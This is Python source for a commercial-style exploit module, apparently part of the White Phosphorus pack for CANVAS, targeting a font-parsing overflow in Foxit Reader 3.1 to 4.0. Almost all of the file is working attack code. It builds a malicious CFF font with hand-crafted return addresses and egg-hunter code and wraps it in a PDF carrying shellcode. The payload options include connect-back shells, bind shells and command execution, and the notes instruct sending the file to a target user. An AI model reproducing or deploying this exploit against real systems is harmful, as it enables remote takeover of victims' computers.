
#! /usr/bin/env python
######################################################################################
# White Phosphorus Exploit Pack
#
# Proprietary source code - use only under the license agreement in distribution
#
######################################################################################


#Standard Imports
import sys 
sys.path.append(".")
sys.path.append("3rdparty/White_Phosphorus/libs")

import os
import socket
import sys
import time
import zlib
import shutil
from struct import *
from cStringIO import StringIO

# CANVAS imports
from exploitutils import *
from wp_exploit import *
from wp_dialog import *
from wp_osversions import *
from MOSDEF import mosdef
from httpclientside import httpclientside


######################################################################################
NAME = "Foxit Reader  v3.1 - 4.0 FreeType2 Compact Font Format Overflow"
DESCRIPTION = "Exploits an overflow in Foxit Reader  v3.1 - 4.0"
VERSION = "1.0"
DOCUMENTATION = {}
DOCUMENTATION['VENDOR']='Foxit'
DOCUMENTATION["Date public"] = ""
DOCUMENTATION['VersionsAffected']='3.1, 3.2, 3.3, 4.0'
DOCUMENTATION["References"] = """http://www.foxitsoftware.com/pdf/reader/security_bulletins.php#iphone
http://osvdb.org/67011"""
DOCUMENTATION["Repeatability"] = "Unlimited"                              
DOCUMENTATION['CVE'] = "CVE-2010-1797"
DOCUMENTATION['CVE Url'] = 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-1797'
DOCUMENTATION['Notes']="""
Run the module and send the created file to the target user."""

# Targets
PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Clientside"
PROPERTY['ARCH'] = [ ["Windows"] ]
PROPERTY['VERSION'] = [ "XP", "7", "2000", "2003", "Vista"]

NOTES="""
WP> White Phosphorus Exploit Pack
WP> Foxit Reader <= 4.0 FreeType2 Compact Font Format Overflow
---------------------------------------------------------------------
Usage:
-T (check if target is vulnerable)
-v <version to target>
-t <target ip>   -p <target port>
-l <callback ip> -d <callback port>
-F <filename>

Payload Options:
-O payload:<#>   (will use default if not specified)
-O command:<cmd> (for Execute Command payload)
-O bind:<port>   (for Bind MOSDEF Shell)

Versions:
0: Windows Universal (Non-DEP)

Payloads:
0: TCP Connect Back
1: IE Inject Connect Back
2: HTTPMOSDEF SSL
3: HTTPMOSDEF PLAIN
4: Bind MOSDEF Shell
5: Execute Command

Example:
./commandlineInterface.py -p 5555 -v 17
./3rdparty/White_Phosphorus/exploits/wp_foxit_cff/wp_foxit_cff.py  -v 0 -t 10.1.1.10 -l 10.1.1.1 -d 5555 -O payload:0
"""

PORT = 0
######################################################################################

# Dialog Hooks
def dialog_update(gtk, wt):
    wp_dialog_update(gtk, wt, theexploit, targets, PORT)
    return

targets = {
    0 : ["Windows Universal (Non DEP)", (0x00000000), [WINALL]]
}


class theexploit(wp_exploit,httpclientside):
    ######################################################################################
    ## WP> Dialog Information
    ##########################s############################################################
    PAYLOADS=["TCP Connect Back",
              "IE Inject Connect Back",
              "HTTPMOSDEF SSL",
              "HTTPMOSDEF PLAIN",
              "Bind MOSDEF Shell",
              "Execute Command"]
              
    DEFAULT_PAYLOAD = 2

    def __init__(self):
        wp_exploit.__init__(self)
        httpclientside.__init__(self)
        self.setInfo(DESCRIPTION)
        self.setInfo(VERSION)
        self.name = NAME
        self.targets = targets
        self.version = 0
        self.isClientD = False
        self.use_universal = True   
        self.encode_printable = False             
        self.badstring='\0\x09\x20\x0a'
        self.filename="".join( [ random.choice(string.uppercase) for x in range(8) ] ) + '.pdf'
        
        return
    
    def usage(self):
        self.wp_usage(targets,"-F <filename>")
        return        
        
    def displayVersions(self):
        for t in targets.keys():
            print 'WP> Version %d: %s'%(t,targets[t][0])
        return      
        
    def neededListenerTypes(self):
        # We use this function to grab different shellcode type and os types
        self.getArgs()

        return self.wp_createWin32Listener()

    def createShellcode(self):
        # We use this function to grab different shellcode type and os types
        self.getArgs()

        self.log('WP> Targeting version %d: %s'%(self.version,targets[self.version][0]))
        return self.wp_createShellcode()    
    
    def getArgs(self):
        # Selected shell options
        self.wp_getShellcodeType()

        # If called from clientD there will be no target here
        if self.target:
            self.host=self.target.interface
        self.filename=self.argsDict.get('filename',self.filename)
                   
        return
    
    def wb(self, f, n):
        f.write(chr(n))
        return
    
    def wh(self, f, n):
        f.write(struct.pack('>H', n))
        return
    
    def ww(self, f, n):
        f.write(struct.pack('>I', n))
        return
    
    def write_index(self, f, idx):
        count = len(idx)
        self.wh(f, count)
        if count == 0: return
        self.wb(f, 4) # offsize
        q = 1
        for i in xrange(count+1):
            self.ww(f, q)
            if i != count:
                q += len(idx[i])
        for thing in idx:
            f.write(thing)
        return
    
    def writeN(self, f, n):
        f.write(struct.pack('>BI', 255, n))
        return
    
    def makecff(self):

        from cStringIO import StringIO
        searchcode = wp_SearchCode(False)  
        
        f = open('3rdparty/White_Phosphorus/exploits/wp_foxit_cff/out.cff','wb')
        f.write(open('3rdparty/White_Phosphorus/exploits/wp_foxit_cff/z.cff','rb').read())
        
        magic_number = 170      # This is the offset on the stack 179
              
        stage1 = "\xAA\xAA\xAA\xAA\x01\x00\x00\x00\x36\x10\x40\x00\xFF\xE4\x32\x32\x33\x33\x33\x33\x01\x00\x00\x00" 
        
        #ret to 00401059   83C4 10          ADD ESP,10, RETN
        stage1 += "\x59\x10\x40\x00"*6  # 00401036
        stage1 += "\xFF\xE4\x32\x32\x33\x33\x33\x33\x01\x00\x00\x00\x01\x00\x00\x00"
        #ret to 0040104B   8B4C24 08        MOV ECX,DWORD PTR SS:[ESP+8]
        stage1 += "\x4b\x10\x40\x00"    # 0040104b
        stage1 += "\x32\x32\x32\x32\x33\x33\x33\x33\xf0\x0c\x01\x00"
        stage1 += "\x32\x32\x32\x32\x33\x33\x33\x33"
        
        # ret to 00401036
        stage1 += "\x36\x10\x40\x00"    # 00401036
        stage1 += "\xFF\xE4\x32\x32\x33\x33\x33\x33\x01\x00\x00\x00"
        stage1 += "\x36\x10\x40\x00"*3  # buffer
        stage1 += "\xf8\x0c\x01\x00"    #00010c10+8 is where we wrote jmp esp
        
        stage1+="\x8b\x54\x24\x54" #movl 0x54(%esp),%edx
        stage1+= "\xe9\x58\xfd\xff\xff" #jmp back

        stage1 += searchcode
        stage1 += "\xCC" * (176 - len(stage1))
        
        stage2="A" * 10
        
        info = struct.unpack('I'*(len(stage1)/4), stage1)
                
        g = StringIO()
        for a in info:
            self.writeN(g, a)
        
        index_number = (magic_number - 1) * 0x10000
        self.writeN(g, index_number)
        self.writeN(g, index_number)
        self.writeN(g, index_number)
        
        for i in xrange(65 - len(info) - 3):    # was 65
            g.write(struct.pack('>BB', 12, 23)) # random
            g.write(struct.pack('>BB', 12, 23)) # random
            g.write(struct.pack('>BB', 12, 4))  # or /* add doesn't work. why?? */
            g.write(struct.pack('>BB', 12, 29)) # index
        
        # the plus is to get to the END
        for i in xrange(magic_number -32): # was 32            
            g.write(struct.pack('>BB', 12, 23)) # random
            g.write(struct.pack('>BB', 12, 29)) # index
            
        for i in xrange(len(info)):
            g.write(struct.pack('>BB', 12, 29)) # index
            g.write(struct.pack('>BB', 12, 18)) # drop
            
        
        self.writeN(g, 0) # goto overflow so I don't have to worry about finalization
        g.write('\x0e') # endchar
        
        gvalue = g.getvalue()
        gvalue2 ='\0' * (4 - (len(gvalue) % 4))
        gvalue = gvalue.replace(struct.pack('>I', 0xdeadbeef), struct.pack('>I', len(gvalue) + len(gvalue2)))
        gvalue2 += stage2
        
        self.write_index(f, ['\x0e\x0e\x0e\x0e', gvalue])
        f.write(gvalue2)
        return

    
    def makefile(self):

        self.makecff()
        
        u = open('3rdparty/White_Phosphorus/exploits/wp_foxit_cff/out.cff').read()
        z = zlib.compress(u)
        pdf = open('3rdparty/White_Phosphorus/exploits/wp_foxit_cff/out.pdf.template').read()
        pdf = pdf.replace('XXX', z).replace('YYY', str(len(z)))
        
        # add shellcode in
        payload="A" * 10
        payload+='c00kc00k' + self.shellcode
        payload+="B" * 100
                       
        pdf = pdf.replace('SHELL', payload)
        
        open(self.filename, 'w').write(pdf)        
        return

    def run(self):
        self.log("WP> Opening %s for output"%(self.filename))
        self.makefile()
        self.log('WP> Output Complete')
        return 1

if __name__== '__main__':
    print 'WP> Running White Phosphorus %s Exploit v %s'%(NAME,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
